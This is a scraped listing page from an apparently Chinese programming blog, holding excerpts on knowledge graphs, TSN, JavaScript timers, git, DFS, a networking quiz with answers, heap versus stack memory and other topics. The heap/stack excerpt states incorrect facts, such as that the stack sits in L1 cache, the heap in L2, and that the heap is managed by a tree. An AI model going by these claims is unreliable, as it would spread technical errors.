		0. 引言 现在的很多数据是互相连接的，如果想分析这些链接的价值，知识图谱可以是一种有效的工具。而且随着万物互联时代的到来，链接中所包含的信息必然会发挥更大的价值，这也是为什么知识图谱在最近几年发展这么快的主要原因。
1. 知识图谱的基础知识 知识图谱的基础知识部分，包含知识图谱的定义、与知识图谱定义相关的重要概念、知识图谱的组成要素和知识图谱中知识的结构化表示方法的相关内容。目的是掌握知识图谱相关的基础理论知识，方便在后续事件中，明晰具体（软件）工具构建在知识图谱体系中的作用与意义。详细内容，请参见作者文章：知识图谱：基础知识
2. 知识图谱的构建 构建知识图谱时按所用数据情况不同，有三种任务场景：利用非结构化数据构建知识图谱，利用结构化数据构建知识图谱，利用混合数据（既包含结构化也包含非结构化数据）构建知识图谱。
从非结构化数据构建知识图谱时，先进行信息抽取和信息融合任务，从语料数据中抽取出规定的实体、关系和属性，完成数据的结构化；然后再根据提取到的结构化数据构建知识图谱。根据结构化数据构建知识图谱的方法更为简单，就是直接从字段中抽取实体、关系和属性构建知识图谱即可。混合数据的情况就是叠加前两种情况的操作。
3. 知识图谱的分类 知识图谱分为开放域知识图谱（Open Domain Knowledge Graph）和领域知识图谱（Domain-specific Knowledge Graph）两类。其中，开放域知识图谱保存通用的知识，其数据来源一般源自非结构化数据。而领域知识图谱保存特定领域的知识，其数据来源一般源自结构化数据和非结构化数据，在公司实际工作中领域图谱更受重视，因为它聚焦于垂直领域、面向具体业务问题。
4. 知识图谱的存储 知识图谱的存储有四种实现方式：
根据自己的需求从零开发一个定制存储系统；使用已有的RDF（三元组，Triple）存储系统；使用已有的图数据库存储系统（如：Neo4j 等）；基于开源存储系统，按任务需求开发专属存储系统。 在企业工作中，人们常用图数据库存储知识图谱；而在学术研究中，人们常用RDF（Resource Description Framework）存储知识图谱。他们的特性对比，如下表所示：
表1 RDF与图数据库的特性对比 RDF特点图数据库特点存储三元组（Triple）（边和节点）可以带有属性的图结构具有标准化的推理引擎没有标准的推理引擎遵循W3C标准图遍历效率极高易于发布数据具有事物管理功能多数为学术应用场景基本为工业应用场景 Neo4j 是目前主流的图数据库，它具有开发成熟、使用人数多且社区活跃的优势。但同时应注意的是，目前版本的 Neo4j 暂不支持准分布式，且对硬件、特别是对内存空间的要求比较高。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/14aa32511ac6983962af8f66744e9ce3/" rel="bookmark">
			配置系统环境变量的时候误删了Path怎么办？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		hello，各位小伙伴们大家好！
那么今天就是给大家分享一个方法，就是我们想要配置新的jdk环境时在删除旧的环境变量时不小心把系统变量里面的Path删除了，那么我们如何恢复呢？
网上的教学方法层出不穷，像什么复制别人电脑里的环境变量或者重启都解决不了问题的。
一般的方法都是去注册编辑器里面找，那么今天分享一个更简单的方法，帮你快速找回！
STEP1:
按住键盘win+R,输入 echo %Path% 打开命令窗口
echo %Path% STEP2:进来之后是这个界面，我们只需要复制红色框框圈起来的所有内容。
STEP3:这个时候我们鼠标右键此电脑-&gt;属性-&gt;高级系统设置-&gt;环境变量，找到我们的删除Path的地方，然后按照下图操作便可。变量值就是我们刚才复制的那些内容。
那么到这里我们的Path就已经找回来了，学会了点个关注一键三连啦！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6107bd6ebb9cd9bc11f80a2966fc1d8d/" rel="bookmark">
			时间敏感网络（TSN）关键协议的介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		TSN的概述 为了简洁明了，此笔记不再介绍TSN的背景知识。
由于通信主体的演进，各个业务对于时间敏感程度愈加严格。为了构建一个统一的数据链路层协议，通过标准化使其在不同的领域都可以同构运行，提供实时数据的传输保障。
时间敏感网络（TSN）是以标准以太网为网络基础、提供确定性信息传输的标准化技术，通过时间感知的调度机制最小化抖动，并且为时间敏感应用提供可靠的数据传输保障。
时间敏感网络是一个二层网络技术（数据链路层），其数据转发依靠以太网的分组头部信息，数据帧的负载信息不受上层网络协议的限制，所以时间敏感网络可以根据需求部署在任何使用以太网技术的网络环境中。
时间是TSN的主要专注点，其旨在提供一种机制来确保信息能够在一个确定的、可预测的时间范围内完成源目的节点之间的传输，TSN具有以下目标：
针对交换网络的报文时延得到保障；时间敏感数据流和非时间敏感数据流可以混合传输，并且非时间敏感数据流的传输不会影响时间敏感数据流的传输时延；多种高层协议可以共享网络基础设施，即多种协议的负载可以同时在网络中传输；网络错误可以通过源头获得精确的信息，从而快速地确诊和修复。 时间敏感网络的协议及说明 TSN 处于 OSI 七层模型的数据链路层，以处理数据的调度、以太网数据帧的封装与分组任务。发送者的数据传输至接收者需要经过若干节点，其中每个节点都有对应的数据队列和同步时钟，而每个节点都根据分布式时钟进行时间同步计算，通过队列处理数据的优先级，包括快速通道方式和抢占机制等。
接下来从时间同步、调度、流量整形、流预留等方面对TSN及其相关标准作进一步解释。
时间同步（IEEE 802.1AS） TSN使用 IEEE 802.1AS 广义精准时间同步协议（gPTP），该协议基于 IEEE 1588V2 产生，提供全局精准时间同步，是PTP的特定配置文件。IEEE1588 ，全称网络测量和控制系统的精密时钟同步协议标准，又称精确时间协议（PTP），主要用于以太网和分布式网络的各节点的时钟同步。
IEEE1588V2 是PTP协议的第二个版本。IEEE 802.1 AS并非IP路由的协议且完全基于二层网络，但是其工作模式与 PTP 协议保持一致。
gPTP与PTP的同步机制类似，利用最佳主时钟算法（BCMA）在网络中选择主时钟并建立同步时钟树，然后利用对等路径时延测量机制计算主从时钟端口间的时间误差来进行同步。
调度与流量整形 不同类别的流量对网络的可用带宽和端到端时延有不同要求，调度和流量整形使得不同类别的流量在同一网络上得以共存。
流识别 IEEE 802.1Q TSN设备必须准确区分时间敏感流与其他流。IEEE 802.1Q标准描述了识别和区分时间敏感类型与其他类型流量的基本原理。** IEEE802.1Q **标准中使用了8个不同级别的优先级，这些优先级分别用来标记网络流量的重要程度。
拓展：在传统以太网交换中，如果一个交换机已经开始在其一个端口上传输以太网帧，即使是最高优先级的帧也必须在交换机的缓冲区内等待正在传输的帧传输完成。由于这种以太网交换机内的缓冲效应，端到端传递时延的非确定性是无法避免的。
以太网帧结构和 IEEE 802.1 VLAN 标记如图 2 所示，以太网帧头中 IEEE 802.1Q VLAN 标签内的优先级代码点（PCP）字段和 VLAN 识别符（VID）定义了TSN 流的标识。PCP 字段和 VID 是根据与流关联的应用程序分配的。
门控制调度 IEEE 802.1Qbv 排队与转发 为了可靠和及时的信息交付，TSN工作组在 IEEE 802.1Q的基础上提出了 IEEE 802.1Qbv标准。IEEE 802.1Qbv标准中定义了时间感知调度器，旨在优化以太网帧的传输优先级，保证信息在规定时间内送达。
时间感知调度的基本思想是采用时分多址（TDMA），将以太网的通信分为固定长度、重复的时间片，称
为周期；每个周期又划分为多个更细粒度的时间片，称为时间槽。每个时间槽可以分配给 8 个以太网优先级中的一个或多个，即在特定时间段内形成了虚拟通信信道，使特定的实时数据能够在非实时数据负载中穿插传输，减小了其他突发或异常的发送请求对实时数据传输的影响。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6107bd6ebb9cd9bc11f80a2966fc1d8d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d41d675df79cc005f831e39672dd8a8/" rel="bookmark">
			window对象——定时器简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JavaScript的程序执行速度时非常快的，如果希望一段程序每隔一段时间执行一次，可以使用定时调用。
setInterval() 定时调用，设置一个定时器，可以将一个函数每隔一段时间被调用一次调用该方法会返回一个Number类型的数据，这个数字作为定时器的唯一标识（timeID）参数： 回调函数，该函数每隔一段时间被调用一次每次调用间隔的时间，单位是毫秒 语法：setInterval(回调函数，时间间隔);
var num = 1; var timeID = setInterval(function(){ alert(num++); },1000); clearInterval() 该方法可以用来关闭定时器方法中需要一个定时器的标识作为参数（timeID），关闭对应的定时器 语法：clearInterval(timeID);
clearInterval(timeID); setTimeout() 延时调用，延时调用一个函数，不会马上执行，而是隔一段时间后再执行，用法和setInterval()类似延时调用和定时调用的区别，定时调用会执行多次，而延时调用只会执行一次延时调用和定时调用实际上是可以互相代替的，在开发中可以根据需要去选择 语法：setTimeout(回调函数，时间间隔);
var num = 1; var timeID = setTimeout(function(){ alert(num++); },1000); clearTimeout() 该方法可以用来关闭延时器方法中需要一个延时器的标识作为参数（timeID），关闭对应的延时器 语法：clearTimeout(timeID);
clearTimeout(timeID); 切换图片练习
&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; * { margin: 0%; padding: 0%; } &lt;/style&gt; &lt;script&gt; window.onload = function () { /** * 使图片可以自动切换 */ //获取img var img1 = document.getElementById("img1"); //创建一个数组保存图片路径 var imgArr = ["
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0d41d675df79cc005f831e39672dd8a8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b856d5c8f60e7c265617a8fb8a317ebe/" rel="bookmark">
			第一章 计算机网络与因特网概述练习题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. (单选题)TCP/IP体系结构中的TCP和IP所提供的服务分别为( ) A. 应用层服务和网络层服务B. 网络层服务和传输层服务C. 传输层服务和网络层服务D. 传输层服务和应用层服务 正确答案：C
TCP指的是“传输控制协议”，是传输层协议，因此提供的服务是传输层服务；IP指的是“网络互连协议”，是网络层协议，因此提供网络层服务。
2. (单选题)网络层、数据链路层和物理层传输的数据单位分别是( ) A. 报文、帧、比特B. 分组、报文、比特C. 分组、帧、比特D. 数据块、分组、比特 正确答案：C
3. (单选题)在OSI体系结构中,哪一层负责分组的选路? A. 物理层B. 数据链路层C. 网络层D. 传输层 正确答案：C
网络层提供不同网络之间的选路服务。
4. (单选题)以下( )按正确顺序包括了OSI模型的各个层次 A. 物理层,数据链路层,网络层,运输层,会话层,表示层和应用层B. 物理层,数据链路层,网络层,运输层,系统层,表示层和应用层C. 物理层,数据链路层,网络层,转换层,会话后,表示层和应用层D. 表示层,数据链路层,网络层,运输层,会话层,物理层和应用层 正确答案：A
5. (单选题)以下关于带宽的说法中错误的是( ) A. 带宽越高,传播速度越快。B. 表示通信线路允许通过的信号频带范围称为线路的带宽。C. 带宽越高,意味着同一时间间隔能够发送的比特数目越多。D. 一个网络的带宽是该网络所有链路带宽的最小值。 正确答案：A
带宽不是决定上网速度的唯一因素，网络延迟等也会影响传播速度。
6. (单选题)随着微型计算机的广泛应用,大量的微型计算机是通过局域网连入广域网,而局域网与广域网的互联是通过( )实现的。 A. 通信子网B. 路由器C. 城域网D. 电话交换网 正确答案：B
路由器：存储转发机制，连接异构的网络。
7. (单选题)计算机网络拓扑结构中,若每一个结点和网中其他任何结点均有链路链接,该拓扑结构为? A. 星形结构B. 树形结构C. 网状结构D. 环形结构 正确答案：C
8. (单选题)不使用”存储-转发”交换方式的有( ) A. 电路交换B.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b856d5c8f60e7c265617a8fb8a317ebe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c14972139ca5a308ab8b727f875e9415/" rel="bookmark">
			深度优先搜索及讲解【新手易懂】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、深度优先搜索概念 DFS（Depth-First Search）：深度优先搜索属于图算法的一种，其过程简要来说是对每一个可能的分支路径深入到不能再深入为止，而且每个节点只能访问一次。
深度优先遍历图的方法是，从图中某顶点v出发：
访问顶点v；依次从v的未被访问的邻接点出发，对图进行DFS；直至图中和v有路径相通的顶点都被访问；若此时图中尚有顶点未被访问，则从一个未被访问的顶点出发，重新进行DFS，直到图中所有顶点均被访问过为止。 深度优先遍历使用的数据结构是栈（Stack），将访问过的节点标记后，并压入栈中，再遍历此时跟栈顶元素相关联的节点，将其中未标记的节点标记，并压入栈中……以此类推，当该栈顶的元素相关联的节点都被访问过了，则该元素弹出栈……直到栈空，遍历完成。
二、深度优先搜索算法举例 ​ 给定一个无向图graph，当这个图为二分图时返回true。 如果我们能将一个图的节点集合分割成两个独立的子集A和B，并使图中的每一条边的两个节点一个来自A集合，一个来自B集合，我们就将这个图称为二分图。 graph将会以邻接表方式给出，graph[i]表示图中与节点i相连的所有节点。每个节点都是一个在0到graph.length-1之间的整数。这图中没有自环和平行边：graph[i]中不存在i，并且graph[i]中没有重复的值。 示例 1: 输入: [[1,3], [0,2], [1,3], [0,2]] 输出: true 解释: 无向图如下: 0----1 | | | | 3----2 我们可以将节点分成两组: {0, 2} 和 {1, 3}。 示例 2: 输入: [[1,2,3], [0,2], [0,1,3], [0,2]] 输出: false 解释: 无向图如下: 0----1 | \ | | \ | 3----2 我们不能将节点分割成两个独立的子集。 ​ 该题即利用栈，从某一个节点按顺序出发，如果未标记，则压栈并标记，栈非空时，则出栈并将关联的节点继续压栈，直到栈空为止，再下一个节点……
#include&lt;iostream&gt; #include&lt;cstdio&gt; #include&lt;iomanip&gt; using namespace std; int m,n,a[10010]={0},b[10010]={0}; void d(int k) { for(int i=a[k-1];i&lt;=m;i++) { if(b[i]==0) { b[i]=1; //赋值 a[k]=i; if(k==n) { for(int j=1;j&lt;=k;j++) { cout&lt;&lt;setw(3)&lt;&lt;a[j]; } cout&lt;&lt;endl; } else	d(k+1); //返回 b[i]=0; //每当执行完都要为下一条做准备初始化 a[k]=0; } } } int main() { cin&gt;&gt;m&gt;&gt;n; a[0]=1; d(1); return 0; } ​ 上面这题通过自己手动创建栈来维护了深度遍历的结构，下面再看一题利用递归的方式来做的：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c14972139ca5a308ab8b727f875e9415/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d21c45c5d3d31f1368691f94af93428f/" rel="bookmark">
			git学习--本地仓库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.Git与GitHub的区别
Git是一个分布式版本控制，简单来说就是一个软件，用于记录一个或若干个文件内容变化，以便将来查阅特定版本修订情况的软件。
GitHub是一个为用户提供git服务的网站，简单来说就是一个可以放代码的地方。GitHub除了提供管理Git的web界面外，还提供了订阅、关注、讨论组、在线编辑等丰富的功能。
2.Git工作流程
工作区：添加、编辑、修改等动作
暂存区：暂存已经修改的文件，最后统一提交到Git仓库。 Git仓库：最终确定的文件保存到仓库，成为一个新的版本，任何人可见。
3.本地仓库操作
什么是仓库？仓库又名版本库，英文名repository，我们可以简单理解为一个目录，用于存放代码的，这个目录里面的所有软件都可以被Git管理起来，每个文件的修改、删除等操作Git都能跟踪到。
安装Git后需要进行全局配置 在桌面空白处右键，点击“Git Bash here”以打开Git命令窗口
（git可以记录项目中每个成员所做的修改）
$git config --global user.name "用户名"
$git config --global user.email "邮箱地址"
创建仓库 小白学习Git时可以创建新目录，不建议在现有项目来学习Git 创建一个文件夹，并进入到该文件夹，进行初始化（使用git init），使得Git知道需要管理这一个文件夹
.git是Git创建的，该文件不能随意修改。
Git常用指令 查看当前状态：git status [非必要]
添加到缓存区：git add文件
说明：git add指令，可以一次添加一个文件，也可以同时添加多个文件
语法一：git add 文件名
语法二：git add 文件名1 文件名2 文件名3....
语法三：git add. [添加当前目录到缓存区，注意‘.’]
提交至版本库：git commit -m "注释内容" 4.时光穿梭机---版本回退
步骤：
1.查看版本，确定需要回到的刻点
指令：git log（log是日志的意思）
git log显示的结果
git log --pretty=online （常用）
一行只显示一个commit id和文件的描述（可以看出写注释的重要性）
2.回退操作
git reset --hard 提交编号（commit id）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d21c45c5d3d31f1368691f94af93428f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c776d6300ab896aed3de538ec4be825/" rel="bookmark">
			什么是堆栈以及堆栈的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 本文首发于公众号【程序员华仔】
------------------
首先说明下，这里讨论的堆和栈，是指程序内存中的“堆区”和“栈区”，并非是数据结构中所说的堆和栈。
要了解程序内存中的堆栈，需要先了解C语言的内存模型。
C语言的内存模型分为5个区：代码区，全局区，常量区，堆区和栈区。
1. 代码区
存放二进制代码区域，在ELF中称为.text段。
2.全局区
存放全局和静态变量的区域。
其中初始化的全局和静态变量在全局的一个区域，在ELF中取名为.data段。 未初始化的全局变量和静态变量在临近一个区域, 在ELF中为.bss段。
全局区的内存由系统分配，并在程序结束后，由系统释放。
3.常量区
存储常量的区域。不允许修改。
该区的内存在程序结束的时候，由系统释放。
4.堆区（Heap）
存放程序员创建的变量的区域，是一块不连续的区域，一般使用new，alloc，calloc，malloc关键字创建的变量，这些变量需要程序员调用delete，release，free关键字才能释放。若没有调用，则会造成内存泄露。
5.栈区（Stack）
存放函数的参数，局部变量的区域，由编译器自动分配和释放。通常在作用范围域外就会释放变量。形式上类似于数据结构中栈。因为在CPU的指令集中分配内存，所以操作快且效率高。但是空间就很有限，例如iOS的栈区大小就是2M。
堆和栈概念
堆是一大块不连续的区域，一般使用数据结构中的链表来组织管理，在分配过程中，容易产出内存碎片。
栈是一小块连续的区域，一般使用队列按先进后出（First In Last Out）（FILO）的方式进行排序，并且只能在一端（栈顶（top））对数据进行插入和删除操作。
堆与栈区别
堆与栈，是操作系统对进程的内存空间的两种不同的管理方式，主要有如下几种区别：
（1）分配方式不同：
栈：由操作系统自动分配和释放，无需我们手动操作。分配方式类似数据结构中的栈。
堆：申请和释放工作由程序员自行完成，若程序员不释放，就会产生内存泄露。分配方式类似数据结构中的链表。
（2）空间大小不同：
栈：栈的空间大小远远小于堆。比如iOS栈为2M，64位的Linux默认10MB。
堆：理论上，进程可申请的堆大小为虚拟内存的大小。
（3）存放内容不同：
栈：存储函数返回地址、参数、局部变量和寄存器等内容。
堆：具体存放内容由程序员自定义填充。
（4）缓存方式不同：
栈：存放在一级缓存，被调用时放入存储空间中，调用完成就立即释放。
堆：存放在二级缓存中，一般使用引用计数（iOS）进行管理。
（5）数据结构不同：
堆：一般使用数据结构中的树来管理。
栈：一般使用先进后出的队列来管理。
（6）分配效率不同：
栈由操作系统自动分配，在CPU的指令集中完成分配并且有硬件层的支持（专门寄存器负责存储，专门指令负责压栈出栈）。
堆是由系统内核API接口来完成申请与管理，实现机制较为复杂，并且频繁的内存申请容易产生内存碎片。这样栈的分配效率比堆高多了。
以上就是堆栈的六大差异点。
iOS App内存布局
下面再看下iOS App的内存布局，下图所示。
正如上图所说一样，
1.整个内存空间中，最上面是高位地址，最下面是低位地址；
2.代码段和数据段位于最低地址位，即最底端；
3.在其之上的是堆，用来存放变量；对于ObjC来说，就是new，alloc，calloc，malloc关键字修饰的变量，堆的地址扩展方式是从低往高扩展，即当不够用的时候就往上申请空间地址
4.在往上就是栈了，主要存放函数的参数、局部变量等数据，它的扩展方式是从高往低扩展。
以上就是iOS App的内存布局情况，了解和掌握iOS App的内存布局情况，特别是堆栈分配以及扩展趋势，能帮助我们很好地分析定位问题。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ccb6a15119f2df999f010378eeb1d49/" rel="bookmark">
			实例分割最全综述（上）：二阶段实例分割和一阶段实例分割
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者 | fresher
原文链接：https://zhuanlan.zhihu.com/p/533568152
点击下方卡片，关注“自动驾驶之心”公众号
ADAS巨卷干货，即可获取
1. 实例分割简介 实例分割是结合目标检测和语义分割的一个更高层级的任务。
目标检测：区分出不同实例，用box进行目标定位；
语义分割：区分出不同类别，用mask进行标记；
实例分割：区分出不同实例，用mask进行标记；
因此：
实例分割需要在目标检测的基础上用更精细的mask进行定位，而非bbox；
实例分割需要在语义分割的基础上区分开同类别不同实例的mask；
纵观实例分割的算法发展也是遵循这两条路线：
一类是基于目标检测的自上而下的方案：首先通过目标检测定位出每个实例所在的box，进而对box内部进行语义分割得到每个实例的mask；
另一类是基于语义分割的自下而上的方案：首先通过语义分割进行逐像素分类，进而通过聚类或其他度量学习手段区分开同类的不同实例；
考虑到基于语义分割的的自下而上的实例分割算法（如Semantic Instance Segmentation with a Discriminative Loss Function，Deep Watershed Transform for Instance Segmentation）通常后处理步骤繁琐，且效果较差，本文主要探讨的是基于目标检测的自上而下的实例分割算法。
本文按照所采用的目标检测网络将实例分割算法划分为二阶段实例分割，一阶段实例分割，Query-based 实例分割三大类进行介绍。除此之外，按照对实例分割mask的表征方式的不同，介绍 Contour-based 和 Boundary Refinement 实例分割。
除此之外，一些方法（如：FCIS，TensorMask，deepmask，AdaptIS，MEInst）也都是非常经典的工作，本文由于篇幅原因，并未涉及。
2. 二阶段实例分割 2.1 Mask R-CNN Mask R-CNN是典型的自上而下的实例分割算法，其扩展自目标检测网络Faster R-CNN，在其基础上新增了mask预测分支。
Faster RCNN包含两个阶段, 第一个阶段, 是RPN结构, 用于生成RoI集合。第二个阶段利用RoI pooling从RoI中提出固定尺寸的特征, 然后进行class分类任务和box offset回归任务。
Mask RCNN使用了相同的two-stage结构, 第一阶段使用了相同的RPN网络。第二阶段, 利用RoI Align从RoI中提出固定尺寸的特征, 在执行class分类和box offset 回归任务的同时，MaskRCNN还会给每个RoI生成对应的二值mask；
因此，Mask R-CNN的主要工作集中在RoI Align和mask分支的设计，以下分别进行介绍：
(1) RoI Align 由于RPN阶段得到的proposals box的大小是不一样的，而为了进行后续的class分类，box回归和mask分割任务，必须有一种操作将不同尺寸的box特征图归化到相同的空间尺寸以方便进行batch运算，RoI Pooling和RoI Align的作用就是如此。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5ccb6a15119f2df999f010378eeb1d49/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed5892c7f512b2f4f24243025b8c8cd7/" rel="bookmark">
			【硬件】什么是负电压？怎么产生负电压？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		欢迎关注【玩转单片机与嵌入式】公号，回复关键字获取更多免费视频和资料
回复【加群】，【单片机】、【STM32】、【硬件知识】、【硬件设计】、【经典电路】、【论文】、【毕业设计】、【3D封装库】、【PCB】、【电容】、【TVS】、【阻抗匹配】、【资料】、【终端电阻】、【Keil】、【485】、【CAN】、【振荡器】、[USBCAN]、【PCB】、【智能手环】、【智能家居】、【智能小车】、【555】、【I2C】、【华为】、【中兴】，等……
一：认识小刚
我将通过把小刚放进一个洞里来向你们展示什么是负电压。你很快就会发现，负电压其实没什么奇怪的或神秘的。 认识小刚。他身高1.8米。 小刚身高1.8米是什么意思？你能只看他的头就能找到他的身高吗？ 不。你必须将他的头顶与他站立的地面进行比较，才能找到他的身高。小刚身高1.8米，这实际上意味着他的头顶比他所站立的地面高出1.8米。 电压也是一样。如果不将电压与另一点进行比较，您就无法说出任何关于电压的信息。 通常在电路中定义零点（0V）或地 。 在简单的电池电路中，接地点通常是电池的负端。因此，如果有人说“这个点是5V”，他们通常意味着与地相比是5V。 二、把小刚放进坑里
再回到小刚身上，如果我们挖一个1.8米的坑，然后把小刚放进坑里怎么办？（可怜的小刚同学）。
他的脚现在离地面1.8米。
另一种说法是，他的脚在负1.8米。 小刚仍然是一个完全相同的人，他只是与地面相比，他的位置不同。因此，他的脚的位置变为负数。 电压也是一样。 三、产生负电压
例如，想象有两个9V的电池。 请记住：电池为9V意味着正端比负极高9V。 现在，让我们拿一个电池，假设它的负端将是我们电路中的接地（0V）。 如果我们将第二个电池的正号连接到第一个电池的负号（即我们将其连接到地面），会发生什么情况？ 电池没有任何实际情况。它们与连接它们之前完全相同。 而且没有电流流动。 但是第二个电池的负端的电压是多少？ 由于负值比正值低9V，并且由于正端连接到地，因此电池负端必须为负9V。 因此，我们创建了一个9V的负电压。 如果你仔细观察，我们并没有真正创造任何东西。 我们刚刚将第二块电池的正极标记为0V。 我们标记了第二块电池的负极-9V，因为它比0V低9V。 四：什么时候需要负电压？
有时您会看到需要三个连接的电源的电路，例如+9V，0V和-9V。这在放大器电路中很常见。 但他们也可以说，电路需要+18V、+9V和0V（GND）。这将是完全相同的事情，只是名称不同。 下面列出了几种常用做负电压的情况： 1、人为规定。例如电话系统里是用-48V来供电的，这样可以避免电话线被电化学腐蚀。当然了，反着接电话也是可以工作的，无非是电压参考点变动而已。 2、通讯接口需要。 例如RS232接口，就必须用到负电压。 -3V～-15V表示1，+3～+15V表示0。 这个是当初设计通讯接口时的协议，只能遵守咯。 PS:MAX232之类的接口芯片自带电荷泵，可以自己产生负电压。 3、为（非轨到轨）运放提供电源轨。 老式的运放是没有轨到轨输入/输出能力的，例如OP07，输入电压范围总是比电源电压范围分别小1V，输出分别小2V。 这样如果VEE用0V，那么输入端电压必须超过1V，输出电压不会低于2V。 这样的话可能会不满足某些电路的设计要求。 为了能在接近0V的输入/输出条件下工作，就需要给运放提供负电压，例如-5V，这样才能使运放在0V附近正常工作。 不过随着轨到轨运放的普及，这种情况也越来越少见了。 4、这个比较有中国特色，自毁电路。 一般来说芯片内部的保护电路对于负电压是不设防的，所以只要有电流稍大，电压不用很高的负电压加到芯片上，就能成功摧毁芯片。 五、如何产生负电压
通常需要使用负电压时一般会选择使用专用的负压产生芯片，但这些芯片都比较贵，比如ICL7600，LT1054等。 关注本号，在后台回复【硬件电路】可以获取更多关于硬件设计的视频和教程资料。 也可以加我的Vx：593342536，获取更多资料
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a24cc6c2622b4e6227a8ecb6ac0354e/" rel="bookmark">
			关于程序员的那些表情包~
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
关于Java
IDEA
CV …自欺欺人… 2022.3.24更：
关于Java IDEA CV …自欺欺人… 2022.3.24更： 面试：
idea：
7.23
就找到这么多
持续更新，欢迎投稿
为了图片没有水印我在图片地址后面一个一个的把 “ /watermark ”删掉了……
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/902c74babcc6bbeed49bbabdee50d9a6/" rel="bookmark">
			图论——欧拉图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		部分概念：
欧拉通路：每条路径只走一次的条件下，走完所有的边
欧拉回路：满足欧拉通路的条件下，能走回起点。
所有的边仅走一次，不论节点 （一笔画游戏）
//满足的条件 定义 ind[ i ] , outd[ i ] 为 i 点的入度与出度
在有向图中，存在欧拉通路，当且仅当： 1.图中所有 非0 度数的点连通
2.最多只有 一个 点的 outd[ i ]=ind[ i ]+1
3.最多只有一个点的ind[ i ]=outd[ i ]+1
ps: 当 所有点的 入度==出度 时，存在欧拉回路
寻找并存储欧拉图的代码实现
单词接龙 - 题目 - Daimayuan Online Judge
//注意题中 尾部字母与首部字母相同可相连 用欧拉定理可解释为：
//将每个单词当作一条边，所有点加入可形成欧拉回路 ！！注意要每个点都加入
那么每个单词的首尾字母当成节点 形成一个 首-&gt;尾的有向边
V&lt;int&gt;h[27]; //出度同样可看成每个点连出去的边数 int ind[27], outd[27]; int n = 26, m; //C数组倒序记录欧拉路径（dfs性质） l记录C数组的元素个数 //f数组记录当前节点已经遍历的边数 int f[27],c[N],l; //x起点开始寻找欧拉回路 void dfs(int x) { while (f[x] &lt; outd[x]) { int y = h[x][f[x]]; f[x]++; dfs(y); c[++l] = y; } } void work() { int x, y, z; x = y = z = 0; for (int i = 1; i &lt;= 26; i++) { if (ind[i] !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/902c74babcc6bbeed49bbabdee50d9a6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a9564cf9d6c86004d53e750cead02b8/" rel="bookmark">
			vue2如何在特定路由页面显示/隐藏头部或底部导航（利用meta属性）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在app.vue 监听当前路由，后台查看返回结果：
&lt;template&gt; &lt;div&gt; &lt;!-- 非 ! 非 隐藏头 说明显示 --&gt; &lt;!-- 除了 登录和注册, 其他页面的hideHeader是undefined --&gt; &lt;!-- undefined会判定为false, 通过 非! 变为true --&gt; &lt;my-header v-show="!$route.meta.hideHeader" /&gt; &lt;!-- 路由的占位符, 会根据路径切换成对应的组件 --&gt; &lt;!-- 通过路由切换的 页面组件, 存放在 views 目录下 --&gt; &lt;router-view /&gt; &lt;my-footer /&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import MyHeader from './components/MyHeader.vue' // JS中也支持引入外部css文件 -- 同下方的 @improt 效果 import './assets/css/animate.css' import MyFooter from './components/MyFooter.vue' export default { components: { MyHeader, MyFooter }, // 利用监听器,查看路由变化 watch: { // 监听 $route 属性的变化 $route(newValue) { console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8a9564cf9d6c86004d53e750cead02b8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/262e912d5b0b7627fbbba12ee22d565b/" rel="bookmark">
